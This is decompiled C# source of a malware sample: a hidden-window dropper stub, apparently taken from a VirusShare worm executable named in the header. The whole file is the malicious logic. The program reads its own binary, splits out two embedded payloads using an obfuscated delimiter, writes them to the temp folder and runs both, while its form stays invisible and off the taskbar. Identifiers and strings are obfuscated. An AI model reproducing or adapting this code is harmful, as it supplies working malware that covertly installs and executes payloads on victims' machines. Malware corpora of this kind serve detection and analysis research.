// Decompiled with JetBrains decompiler
// Type: ?1?.?9?
// Assembly: D3Scene, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 88910C3E-C035-4DE2-9B94-1541802FDD71
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.Win32.Bybz.kg-951d6f2160a09558efbf37ce5e095f3dcbb92ffd3b90a3a7417ea27acc08a5f4.exe

using \u003F1\u003F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace \u003F1\u003F
{
  [DesignerGenerated]
  public class \u003F9\u003F : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;

    [DebuggerNonUserCode]
    static \u003F9\u003F()
    {
    }

    [DebuggerNonUserCode]
    public \u003F9\u003F()
    {
      this.Load += new EventHandler(this.\u003F19\u003F);
      \u003F9\u003F.\u003F13\u003F((object) this);
      this.\u003F18\u003F();
    }

    [DebuggerNonUserCode]
    private static void \u003F13\u003F(object _param0)
    {
      lock (\u003F9\u003F.__ENCList)
      {
        if (\u003F9\u003F.__ENCList.Count == \u003F9\u003F.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (\u003F9\u003F.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (\u003F9\u003F.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                \u003F9\u003F.__ENCList[index1] = \u003F9\u003F.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          \u003F9\u003F.__ENCList.RemoveRange(index1, checked (\u003F9\u003F.__ENCList.Count - index1));
          \u003F9\u003F.__ENCList.Capacity = \u003F9\u003F.__ENCList.Count;
        }
        \u003F9\u003F.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(_param0)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool _param1)
    {
      try
      {
        if (!_param1 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(_param1);
      }
    }

    [DebuggerStepThrough]
    private void \u003F18\u003F()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoSizeMode = AutoSizeMode.GrowAndShrink;
      this.ClientSize = new Size(10, 10);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = \u003F40\u003F.\u003F41\u003F("hŪɢͬѰլ");
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void \u003F19\u003F(object _param1, EventArgs _param2)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        string tempPath = Path.GetTempPath();
label_3:
        num3 = 3;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_4:
        num3 = 4;
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_5:
        num3 = 5;
        FileSystem.FileGet(1, ref Expression);
label_6:
        num3 = 6;
        FileSystem.FileClose(1);
label_7:
        num3 = 7;
        string[] strArray = Strings.Split(Expression, \u003F40\u003F.\u003F41\u003F("oĹɺͫѢը٠ܪ\u0860७੬"));
label_8:
        num3 = 8;
        FileSystem.FileOpen(3, tempPath + strArray[3], OpenMode.Binary, OpenAccess.ReadWrite);
label_9:
        num3 = 9;
        FileSystem.FilePut(3, strArray[1], -1L, false);
label_10:
        num3 = 10;
        FileSystem.FileClose(3);
label_11:
        num3 = 11;
        FileSystem.FileOpen(5, tempPath + strArray[4], OpenMode.Binary, OpenAccess.ReadWrite);
label_12:
        num3 = 12;
        FileSystem.FilePut(5, strArray[2], -1L, false);
label_13:
        num3 = 13;
        FileSystem.FileClose(5);
label_14:
        num3 = 14;
        Process.Start(tempPath + strArray[3]);
label_15:
        num3 = 15;
        Process.Start(tempPath + strArray[4]);
label_16:
        num3 = 16;
        this.Close();
label_17:
        num3 = 17;
        Application.Exit();
        goto label_24;
label_19:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_17;
              case 18:
                goto label_24;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_19;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_24:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
